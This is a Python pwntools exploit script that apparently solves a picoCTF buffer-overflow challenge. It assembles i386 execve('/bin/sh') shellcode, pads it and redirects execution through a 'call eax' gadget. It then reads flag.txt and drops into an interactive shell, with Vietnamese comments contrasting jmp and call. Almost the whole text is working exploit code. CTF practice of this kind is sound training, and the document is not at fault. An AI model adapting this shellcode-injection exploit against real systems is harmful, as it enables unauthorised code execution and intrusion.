#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 60633
HOST = "saturn.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# lib = ELF('./libc.so.6', checksec=False)
lib = exe.libc

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x08049DC0
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()
    pause()


# VARIABLE
call_eax = 0x0804901d
jmp_eax = 0x0805333b

# PAYLOAD
shellcode = asm('''
    xor eax, eax
    xor ecx, ecx
    xor edx, edx
    add eax, 0xb
    add esp, 12
    push 6845231
    push 1852400175
    mov ebx, esp
    int 0x80
    ''', arch='i386')
payload = flat(
    shellcode.ljust(0x1c, b'a'),
    call_eax
    )
GDB()
p.sendlineafter('\n', payload)
p.sendline(b'cat flag.txt')

# jmp: Nhảy trực tiếp đến địa chỉ trong eax, không thay đổi stack
# call: Đẩy địa chỉ kế tiếp sau call eax vào stack, sau đó mới nhảy đến eax

p.interactive()